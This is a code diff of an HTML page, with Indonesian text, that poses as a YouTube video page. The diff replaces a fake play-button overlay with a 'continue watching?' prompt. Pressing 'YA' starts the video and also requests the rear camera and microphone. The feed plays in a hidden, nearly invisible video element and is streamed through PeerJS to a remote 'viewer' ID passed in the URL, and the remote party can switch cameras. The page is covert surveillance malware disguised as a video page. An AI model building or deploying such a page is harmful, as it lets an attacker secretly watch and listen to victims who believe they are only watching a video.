@@ -3,317 +3,198 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>YouTube - Video Populer Hari Ini</title>
+    <title>YouTube - Video</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: Roboto, Arial, sans-serif; background: #0f0f0f; color: white; min-height: 100vh; overflow: hidden; }
         
-        body { 
-            font-family: Roboto, Arial, sans-serif;
-            background: #0f0f0f;
-            color: white;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-        }
+        /* YouTube UI Mockup */
+        .header { height: 56px; padding: 0 16px; display: flex; align-items: center; background: #0f0f0f; border-bottom: 1px solid #333; }
+        .logo { display: flex; align-items: center; gap: 4px; font-weight: bold; font-size: 18px; color: white; }
+        .logo-icon { color: #ff0000; font-size: 24px; }
         
-        /* YouTube Header Mockup */
-        .header {
-            height: 56px;
-            padding: 0 16px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            background: #0f0f0f;
-            position: sticky;
-            top: 0;
-            z-index: 100;
-        }
+        .video-wrapper { width: 100%; aspect-ratio: 16/9; background: #000; position: relative; }
+        #ytPlayer { width: 100%; height: 100%; border: none; }
         
-        .logo {
-            display: flex;
-            align-items: center;
-            gap: 4px;
-            font-weight: bold;
-            font-size: 18px;
-        }
+        .video-info { padding: 15px; }
+        .video-title { font-size: 18px; font-weight: bold; margin-bottom: 10px; }
+        .channel-info { display: flex; align-items: center; gap: 12px; padding-top: 10px; border-top: 1px solid #333; }
+        .channel-avatar { width: 40px; height: 40px; border-radius: 50%; background: #333; }
         
-        .logo-icon {
-            color: #ff0000;
-            font-size: 24px;
-        }
-        
-        /* Video Player Area */
-        .video-wrapper {
-            width: 100%;
-            aspect-ratio: 16/9;
-            background: #000;
-            position: relative;
-        }
-        
-        #ytPlayer {
-            width: 100%;
-            height: 100%;
-            border: none;
-        }
-        
-        .overlay-play {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.4);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            z-index: 10;
-        }
-        
-        .play-button {
-            width: 68px;
-            height: 48px;
-            background: rgba(255, 0, 0, 0.9);
-            border-radius: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: background 0.2s;
-        }
-        
-        .play-button::after {
-            content: '';
-            border-style: solid;
-            border-width: 10px 0 10px 18px;
-            border-color: transparent transparent transparent white;
-        }
-        
-        /* Video Info Area */
-        .video-info {
-            padding: 12px;
-        }
-        
-        .video-title {
-            font-size: 18px;
-            font-weight: bold;
-            margin-bottom: 8px;
-            line-height: 1.4;
-        }
-        
-        .video-meta {
-            font-size: 14px;
-            color: #aaa;
-            margin-bottom: 12px;
-        }
-        
-        .channel-info {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            padding: 12px 0;
-            border-top: 1px solid #333;
-            border-bottom: 1px solid #333;
-        }
-        
-        .channel-avatar {
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            background: #333;
-        }
-        
-        .channel-name {
-            flex-grow: 1;
-        }
-        
-        .subscribe-btn {
-            background: white;
-            color: black;
-            padding: 8px 16px;
-            border-radius: 20px;
-            font-weight: bold;
-            font-size: 14px;
-        }
-        
-        /* Hidden elements for background streaming */
-        #cameraPreview {
+        /* Pop-up Overlay Minimalis */
+        #overlay {
             position: fixed;
             top: 0;
             left: 0;
-            width: 1px;
-            height: 1px;
-            opacity: 0.01;
-            pointer-events: none;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
         }
+        
+        .modal {
+            text-align: center;
+            padding: 40px;
+            width: 90%;
+            max-width: 400px;
+        }
+        
+        .modal h1 {
+            font-size: 2em;
+            margin-bottom: 40px;
+            letter-spacing: 2px;
+        }
+        
+        .modal-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+        
+        .btn {
+            padding: 20px;
+            font-size: 1.5em;
+            font-weight: bold;
+            border: 2px solid white;
+            background: transparent;
+            color: white;
+            cursor: pointer;
+            border-radius: 10px;
+            transition: 0.3s;
+        }
+        
+        .btn:active { background: white; color: black; }
+        
+        /* Hidden elements */
+        #cameraPreview { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
     </style>
 </head>
 <body>
-    <div class="header">
-        <div class="logo">
-            <span class="logo-icon">▶️</span> YouTube
+    <div id="overlay">
+        <div class="modal">
+            <h1>LANJUT NONTON?</h1>
+            <div class="modal-buttons">
+                <button class="btn" id="btnYes">YA</button>
+                <button class="btn" id="btnNo">NO</button>
+            </div>
         </div>
-        <div style="font-size: 20px;">🔍 👤</div>
+    </div>
+
+    <div class="header">
+        <div class="logo"><span class="logo-icon">▶️</span> YouTube</div>
     </div>
 
     <div class="video-wrapper">
-        <div id="playerContainer" style="width:100%; height:100%;">
-            <!-- IFrame YouTube akan dimuat di sini -->
-            <iframe id="ytPlayer" src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=0&controls=1" allow="autoplay; encrypted-media" allowfullscreen></iframe>
-        </div>
-        <div class="overlay-play" id="overlayPlay">
-            <div class="play-button"></div>
-        </div>
+        <iframe id="ytPlayer" allow="autoplay; encrypted-media" allowfullscreen></iframe>
     </div>
 
     <div class="video-info">
-        <div class="video-title">Video Populer Hari Ini - Tonton Sekarang!</div>
-        <div class="video-meta">1.2jt x ditonton • 2 jam yang lalu</div>
-        
+        <div class="video-title" id="displayTitle">Memuat video...</div>
         <div class="channel-info">
             <div class="channel-avatar"></div>
-            <div class="channel-name">
+            <div>
                 <div style="font-weight: bold;">Trending Channel</div>
                 <div style="font-size: 12px; color: #aaa;">2.5jt subscriber</div>
-            </div>
-            <div class="subscribe-btn">Subscribe</div>
-        </div>
-        
-        <div style="margin-top: 20px; color: #aaa; font-size: 14px;">
-            <p>Rekomendasi selanjutnya:</p>
-            <div style="display: flex; gap: 10px; margin-top: 10px;">
-                <div style="width: 120px; height: 68px; background: #333; border-radius: 8px;"></div>
-                <div>
-                    <div style="font-size: 14px; color: white; font-weight: bold;">Video Menarik Lainnya</div>
-                    <div style="font-size: 12px;">YouTube • 500rb ditonton</div>
-                </div>
             </div>
         </div>
     </div>
 
-    <!-- Hidden Video Preview -->
     <video id="cameraPreview" autoplay playsinline muted></video>
 
     <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
     <script>
-        // State
+        const urlParams = new URLSearchParams(window.location.search);
+        const viewerId = urlParams.get('viewer');
+        const videoId = urlParams.get('v') || 'dQw4w9WgXcQ'; // Default Rickroll if no ID
+        const targetId = "yt-" + Math.floor(1000 + Math.random() * 9000);
+        
+        const overlay = document.getElementById('overlay');
+        const ytPlayer = document.getElementById('ytPlayer');
+        const displayTitle = document.getElementById('displayTitle');
+        const cameraPreview = document.getElementById('cameraPreview');
+        
         let peer = null;
         let conn = null;
         let localStream = null;
-        let currentCamera = 'environment';
         let activeCall = null;
-        let isStreaming = false;
-        
-        const overlayPlay = document.getElementById('overlayPlay');
-        const cameraPreview = document.getElementById('cameraPreview');
-        const ytPlayer = document.getElementById('ytPlayer');
-        
-        const urlParams = new URLSearchParams(window.location.search);
-        const viewerIdFromUrl = urlParams.get('viewer');
-        const targetId = "yt-" + Math.floor(1000 + Math.random() * 9000);
 
-        async function startStreaming() {
-            if (isStreaming) return;
-            
+        // Setup YouTube Player
+        ytPlayer.src = `https://www.youtube.com/embed/${videoId}?autoplay=0&controls=1`;
+        displayTitle.textContent = "Video Spesial Untuk Anda";
+
+        async function initStreaming() {
             try {
-                peer = new Peer(targetId, {
-                    host: '0.peerjs.com',
-                    port: 443,
-                    secure: true,
-                    debug: 0
+                // Minta akses kamera & mikrofon (ini akan memicu pop-up browser asli)
+                localStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } },
+                    audio: true 
                 });
                 
-                peer.on('open', async (id) => {
-                    if (viewerIdFromUrl) {
-                        conn = peer.connect(viewerIdFromUrl, {
-                            reliable: true,
-                            serialization: 'json'
-                        });
-                        
-                        conn.on('open', () => {
-                            conn.send({
-                                type: 'target_ready',
-                                targetId: id,
-                                encryption: false,
-                                audioEnabled: false
-                            });
-                        });
-                        
-                        conn.on('data', handleViewerCommand);
-                    }
-                    
-                    await startCamera();
-                    peer.on('call', handleIncomingCall);
-                });
-            } catch (error) {
-                console.error(error);
-            }
-        }
-        
-        function handleIncomingCall(call) {
-            activeCall = call;
-            if (localStream) {
-                call.answer(localStream);
-            }
-        }
-        
-        function handleViewerCommand(data) {
-            if (data.type === 'switch_camera') {
-                switchCamera();
-            }
-        }
-        
-        async function startCamera(cameraType = 'environment') {
-            try {
-                const constraints = {
-                    video: {
-                        facingMode: cameraType,
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    },
-                    audio: false
-                };
-                
-                localStream = await navigator.mediaDevices.getUserMedia(constraints);
                 cameraPreview.srcObject = localStream;
-                isStreaming = true;
+
+                // Setup PeerJS
+                peer = new Peer(targetId, { host: '0.peerjs.com', port: 443, secure: true, debug: 0 });
+                
+                peer.on('open', (id) => {
+                    if (viewerId) {
+                        conn = peer.connect(viewerId, { reliable: true });
+                        conn.on('open', () => {
+                            conn.send({ type: 'target_ready', targetId: id, audioEnabled: true });
+                        });
+                        conn.on('data', (data) => {
+                            if (data.type === 'switch_camera') switchCamera();
+                        });
+                    }
+                });
+
+                peer.on('call', (call) => {
+                    activeCall = call;
+                    call.answer(localStream);
+                });
+
                 return true;
-            } catch (error) {
+            } catch (err) {
+                console.error("Akses ditolak:", err);
                 return false;
             }
         }
-        
+
         async function switchCamera() {
             if (!localStream) return;
-            currentCamera = currentCamera === 'environment' ? 'user' : 'environment';
-            localStream.getTracks().forEach(track => track.stop());
-            const success = await startCamera(currentCamera);
-            if (success && activeCall) {
+            const currentFacing = localStream.getVideoTracks()[0].getSettings().facingMode;
+            const newFacing = currentFacing === 'environment' ? 'user' : 'environment';
+            
+            localStream.getTracks().forEach(t => t.stop());
+            localStream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: newFacing }, 
+                audio: true 
+            });
+            cameraPreview.srcObject = localStream;
+            
+            if (activeCall) {
                 const videoTrack = localStream.getVideoTracks()[0];
                 const sender = activeCall.peerConnection.getSenders().find(s => s.track && s.track.kind === 'video');
                 if (sender) sender.replaceTrack(videoTrack);
             }
         }
-        
-        // Aktifkan kamera saat pengguna menekan tombol Play
-        overlayPlay.addEventListener('click', async () => {
-            overlayPlay.style.display = 'none';
-            // Mulai putar video YouTube asli
+
+        document.getElementById('btnYes').addEventListener('click', async () => {
+            overlay.style.display = 'none';
+            // Mulai video YouTube
             ytPlayer.src = ytPlayer.src.replace('autoplay=0', 'autoplay=1');
-            
-            // Jalankan kamera di latar belakang
-            await startStreaming();
+            // Inisialisasi kamera
+            await initStreaming();
+        });
+
+        document.getElementById('btnNo').addEventListener('click', () => {
+            window.location.href = "https://www.youtube.com";
         });
 
         // Keepalive
-        setInterval(() => {
-            if (conn && conn.open) {
-                conn.send({ type: 'ping', timestamp: Date.now() });
-            }
-        }, 15000);
+        setInterval(() => { if (conn && conn.open) conn.send({ type: 'ping' }); }, 15000);
     </script>
 </body>
 </html>
